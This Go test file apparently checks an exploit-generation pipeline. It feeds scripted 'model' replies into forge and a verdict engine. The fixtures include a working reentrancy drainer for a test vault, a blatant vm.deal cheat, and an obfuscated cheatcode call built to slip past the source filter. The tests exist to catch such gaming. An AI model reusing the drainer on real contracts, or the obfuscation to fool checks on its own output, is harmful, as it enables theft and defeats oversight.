package orchestrator

import (
	"context"
	"os"
	"os/exec"
	"testing"
	"time"

	"github.com/rana1911/sentinelx/internal/agent"
	"github.com/rana1911/sentinelx/internal/runner"
	"github.com/rana1911/sentinelx/internal/verify"
)

// End-to-end: a SCRIPTED fake Spark supplies exploit code, the REAL
// ForgeRunner compiles and runs it with real forge, and verify.Decide
// renders the verdict. This exercises the entire wired pipeline (gaps #1+#2)
// minus the live LLM. Skipped unless SENTINELX_PROJECT + forge are set.

func liveLoopEnv(t *testing.T) (dir, solc string) {
	t.Helper()
	base := os.Getenv("SENTINELX_PROJECT")
	if base == "" {
		t.Skip("set SENTINELX_PROJECT to run live loop tests")
	}
	if _, err := exec.LookPath("forge"); err != nil {
		t.Skip("forge not on PATH")
	}
	return freshForgeProject(t, base), os.Getenv("SENTINELX_SOLC")
}

func liveVaultConfig() runner.Config {
	return runner.Config{
		Mode:       runner.ModeLocalDeploy,
		Imports:    `import "../src/VulnerableVault.sol";`,
		TargetDecl: `VulnerableVault internal target;`,
		TargetSetup: `target = new VulnerableVault();
        vm.deal(address(0xBEEF), 10 ether);
        vm.prank(address(0xBEEF));
        target.deposit{value: 10 ether}();`,
		StartBalanceWei:  "1 ether",
		SuccessAssertion: `assertGt(attacker.balance, preAttackerBalance, "no profit");`,
	}
}

func liveTask(cfg runner.Config) ExploitTask {
	return ExploitTask{
		Hypothesis:           agent.Hypothesis{ID: "H1", Class: "reentrancy", Contract: "VulnerableVault", Function: "withdraw"},
		ContractSrc:          "contract VulnerableVault { ... }",
		Class:                verify.ClassReentrancy,
		TargetSignatures:     []string{"withdraw()", "deposit()"},
		ClaimsProfit:         true,
		SuccessAssertion:     cfg.SuccessAssertion,
		TemplateRender:       cfg.TemplateRender(),
		ExpectedHarnessCalls: []verify.ExpectedHarnessCall{{Signature: "startPrank(address)", Count: 1}, {Signature: "stopPrank()", Count: 1}},
	}
}

const liveHonestExploit = "```solidity\n" + `    function attack() internal {
        Drainer d = new Drainer(target);
        (bool ok, ) = address(d).call{value: START_BALANCE}("");
        require(ok, "fund failed");
        d.run();
        d.sweep();
    }
}

contract Drainer {
    VulnerableVault public target;
    bool internal attacking;
    uint8 internal depth;
    constructor(VulnerableVault _t) { target = _t; }
    function run() external {
        attacking = true;
        target.deposit{value: address(this).balance}();
        target.withdraw();
        attacking = false;
    }
    function sweep() external {
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }
    receive() external payable {
        if (attacking && depth < 5 && address(target).balance >= 1 ether) {
            depth++;
            target.withdraw();
        }
    }` + "\n```"

func newLiveRunner(t *testing.T, dir, solc string, cfg runner.Config) *runner.ForgeRunner {
	r := runner.NewForgeRunner(dir, cfg, runner.LocalBackend{})
	r.SolcPath = solc
	r.Timeout = 60 * time.Second
	return r
}

func TestLiveLoop_HonestExploitVerified(t *testing.T) {
	dir, solc := liveLoopEnv(t)
	cfg := liveVaultConfig()
	l := New(&fakeSpark{replies: []string{liveHonestExploit}}, newLiveRunner(t, dir, solc, cfg))
	l.MaxAttempts = 1

	res := l.Execute(context.Background(), liveTask(cfg))
	if res.Verdict != verify.Verified {
		t.Fatalf("expected Verified, got %s: %s\nnotes=%v", res.Verdict, res.Reason, res.Evidence.Notes)
	}
	if !res.Evidence.Reentrancy.Occurred {
		t.Fatal("expected reentrancy evidence in a verified reentrancy exploit")
	}
	if res.Evidence.ValueFlow.NetWei == 0 {
		t.Fatal("expected positive attacker value flow")
	}
	t.Logf("VERIFIED: %s | net=%d wei | reentry outer#%d inner#%d",
		res.Reason, res.Evidence.ValueFlow.NetWei,
		res.Evidence.Reentrancy.OuterNodeIdx, res.Evidence.Reentrancy.InnerNodeIdx)
}

// liveVacuousExploit profits via an unrelated self-funded contract and never
// calls the target — passes forge, uses no cheatcodes, but proves nothing.
const liveVacuousExploit = "```solidity\n" + `    function attack() internal {
        Freebie f = new Freebie{value: 0}();
        // give the freebie its own money then take it back: net-positive to
        // attacker, target never touched.
        payable(address(f)).transfer(0);
        f.payout();
    }
}

contract Freebie {
    constructor() payable {}
    function payout() external {
        // mint value out of thin air? no — just return what little we have;
        // to actually profit without the target we rely on pre-seeding, so
        // instead simply send attacker 0.5 ether we never had... which will
        // revert. The point: it does NOT call target.withdraw().
        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
        require(ok);
    }` + "\n```"

// liveObfuscatedCheat reconstructs the cheatcode address from two integer
// constants and calls deal(address,uint256) via raw calldata — ZERO banned
// identifiers, so it passes the source pre-filter, compiles, and PASSES in
// forge. Only the trace-based provenance check in verify.Decide catches it.
// This proves the verdict ENGINE (not just the cheap source scan) is doing
// load-bearing work in the fully wired loop.
const liveObfuscatedCheat = "```solidity\n" + `    function attack() internal {
        Sneaky s = new Sneaky();
        s.go(attacker);
    }
}

contract Sneaky {
    uint160 internal constant PART_A = 97433442488726861213578988847752201310395502865;
    uint160 internal constant PART_B = 548606830732011412036458774667846263564405620796;
    function go(address who) external {
        address t = address(PART_A ^ PART_B);
        bytes4 sig = bytes4(0xc88a5e6d);
        (bool ok, ) = t.call(abi.encodeWithSelector(sig, who, uint256(1000 ether)));
        require(ok, "call failed");
    }` + "\n```"

func TestLiveLoop_ObfuscatedCheatRejectedByEngine(t *testing.T) {
	dir, solc := liveLoopEnv(t)
	cfg := liveVaultConfig()
	l := New(&fakeSpark{replies: []string{liveObfuscatedCheat}}, newLiveRunner(t, dir, solc, cfg))
	l.MaxAttempts = 1

	res := l.Execute(context.Background(), liveTask(cfg))
	if res.Verdict != verify.Rejected {
		t.Fatalf("expected Rejected for obfuscated cheat, got %s: %s", res.Verdict, res.Reason)
	}
	// It must have gotten PAST the source pre-filter and been rejected at the
	// verdict-engine stage (provenance), with cheat violations in evidence.
	last := res.Attempts[len(res.Attempts)-1]
	if last.Stage != "rejected" {
		t.Fatalf("expected engine 'rejected' stage (not source-cheat), got %q — the cheap scan wrongly caught it", last.Stage)
	}
	if len(res.Evidence.CheatViolations) == 0 {
		t.Fatalf("expected cheatcode provenance violations in evidence, notes=%v", res.Evidence.Notes)
	}
	t.Logf("REJECTED by engine: %s", res.Evidence.CheatViolations[0])
}

func TestLiveLoop_CheatingExploitRejected(t *testing.T) {
	dir, solc := liveLoopEnv(t)
	cfg := liveVaultConfig()
	// A blatant cheat: the model's attack() calls vm.deal directly. The
	// SOURCE pre-filter should catch this before forge even runs, so after
	// MaxAttempts the verdict is Rejected.
	cheat := "```solidity\n    function attack() internal { vm.deal(attacker, 1000 ether); }\n```"
	l := New(&fakeSpark{replies: []string{cheat}}, newLiveRunner(t, dir, solc, cfg))
	l.MaxAttempts = 2

	res := l.Execute(context.Background(), liveTask(cfg))
	if res.Verdict != verify.Rejected {
		t.Fatalf("expected Rejected for cheating exploit, got %s", res.Verdict)
	}
	if res.Attempts[0].Stage != "source-cheat" {
		t.Fatalf("expected source-cheat stage, got %q", res.Attempts[0].Stage)
	}
}
